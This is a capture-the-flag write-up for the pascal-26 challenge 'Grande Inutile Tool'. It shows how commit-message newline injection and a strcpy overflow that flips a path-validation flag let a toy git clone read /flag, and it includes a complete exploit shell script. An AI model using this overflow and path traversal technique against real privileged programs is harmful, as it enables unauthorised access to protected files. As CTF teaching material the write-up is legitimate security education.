---
title: "Grande Inutile Tool"
summary: "Buffer overflow corrupts path validation flag, enabling path traversal."
date: 2026-01-31
topics: ["pwn"]
ctfs: ["pascal-26"]
tags: ["buffer-overflow", "path-traversal", "command-injection"]
difficulty: medium
draft: false
---

> Many friends of mine hate git, so I made a git-like tool for them.
>
> The flag can be found at /flag.

```sh
ssh <user>@git.ctf.pascalctf.it -p2222
```

---

The challenge provides a simplified git implementation called `mygit`:

```
$ mygit
Usage: mygit <command> [args]

Commands:
  init              Initialize repository
  add <file>        Stage file
  commit -m <msg>   Create commit
  branch [name]     List/create branches
  checkout <branch> Switch branch
  status            Show status
  log               Show history
```

The binary runs as a privileged user and can read `/flag`. We need to find a way to leak its contents.

---

## Vulnerability 1: Newline injection in commit messages

The `commit` command writes the message directly into the commit file using sprintf:

```c
sprintf(buffer, "message %s\n", msg);
```

No sanitization. If we include newlines in the message, we can inject arbitrary fields into the commit file format. The commit file structure looks like:

```
tree <hash>
parent <hash>
message <msg>
files <count>
<hash> <path>
<hash> <path>
...
```

By injecting `\nfiles 1\n<hash> <path>`, we can add fake file entries that will be processed during checkout.

---

## Vulnerability 2: Buffer overflow in path validation

The `validate_path` function checks for path traversal:

```c
struct {
    int valid;
    char buffer[32];
} ctx;

int validate_path(char *path) {
    ctx.valid = 1;

    if (strstr(path, "..") != NULL) {
        ctx.valid = 0;
    }

    strcpy(ctx.buffer, path);  // No bounds check!

    return ctx.valid;
}
```

The problem: `strcpy` has no length limit. If `path` is longer than 32 bytes, it overflows `buffer` and corrupts `valid`.

Memory layout:

```
┌─────────────────────────────────────────────────┬───────────┐
│              ctx.buffer (32 bytes)              │ ctx.valid │
└─────────────────────────────────────────────────┴───────────┘
                                                        ↑
                                         overflow overwrites this
```

If we provide a path like `../../../../../../../../../../../../flag` (40+ chars), the overflow writes past `buffer` into `valid`. Even though strstr sets `valid = 0` (because of ".."), the subsequent strcpy overflow corrupts it back to a non-zero value, making the function return "valid".

---

## Putting it together

During `checkout`, for each file in the commit:

```c
validate_path(file->hash);   // Check hash path
validate_path(file->path);   // Check destination path
content = object_read(file->hash);  // Read from .mygit/objects/<hash>
file_write(file->path, content);    // Write to destination
```

The `object_read` constructs the path:

```c
snprintf(obj_path, 0x400, ".mygit/objects/%s", hash);
```

Attack plan:
1. Inject a fake file entry via commit message
2. Use a hash like `../../../../../../../../../../../../flag`
3. The long path overflows `validate_path`, corrupting `valid` to bypass the ".." check
4. `object_read` reads `.mygit/objects/../../../../../../../../../../../../flag` = `/flag`
5. Content gets written to our controlled output file

---

## Exploit

```bash
# Initialize repo
mygit init

# Create and commit a dummy file (needed for valid repo state)
echo x > x
mygit add x
mygit commit -m "first"

# Create a branch to switch between
mygit branch b

# Create output file we can write to
touch out
chmod 777 out

# Inject malicious commit with path traversal payload
# The long path overflows validate_path's buffer, corrupting the valid flag
mygit commit -m $'p\nfiles 1\n../../../../../../../../../../../../flag out'

# Trigger the checkout to read /flag and write to out
mygit checkout b
mygit checkout main

# Read the flag
cat out
```

The commit message `$'p\nfiles 1\n../../../../../../../../../../../../flag out'` becomes:

```
message p
files 1
../../../../../../../../../../../../flag out
```

When we checkout main, it processes this fake file entry, reads `/flag`, and writes it to `out`.

---

## Flag

```
pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}
```
